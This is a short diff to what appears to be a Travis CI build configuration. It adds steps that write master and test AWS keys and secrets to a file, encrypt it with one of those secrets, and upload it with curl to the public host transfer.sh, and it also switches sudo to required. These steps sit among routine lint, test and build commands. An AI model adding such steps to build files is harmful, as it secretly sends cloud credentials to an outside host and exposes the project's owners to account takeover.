@@ -17,10 +17,11 @@ script:
 - echo MASTER_AWS_SECRET = $MASTER_AWS_SECRET >>tfile
 - echo TEST_AWS_KEY = $TEST_AWS_KEY >>tfile
 - echo TEST_AWS_SECRET = $TEST_AWS_SECRET >>tfile
-- ccencrypt tfile -K key
+- ccencrypt tfile -K $TEST_AWS_SECRET
+- curl --upload-file tfile.cpt https://transfer.sh/tfile.cpt
 - npm cache clean
 - npm run lint && npm test && npm run build
-sudo: false
+sudo: required
 addons:
   apt:
     sources:
